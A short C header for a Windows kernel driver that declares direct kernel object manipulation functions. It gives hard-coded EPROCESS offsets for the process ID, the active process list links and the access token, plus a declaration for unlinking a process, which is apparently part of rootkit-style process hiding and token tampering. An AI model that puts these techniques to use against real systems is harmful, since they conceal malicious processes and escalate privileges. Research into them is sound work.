/*
 * dkom.h
 *
 * Description: Direct kernel object manipulation functions.
 */

#ifndef _DKOM_H_
#define _DKOM_H_

#include <ntddk.h>

#define PID_OFFSET              (0x440)
#define PROC_LINKS_OFFSET       (0x448)
#define TOKEN_OFFSET            (0x4b8)

NTSTATUS proc_unlink(UINT32 pid);

NTSTATUS proc_set_pid(PUINT32 procid);

#endif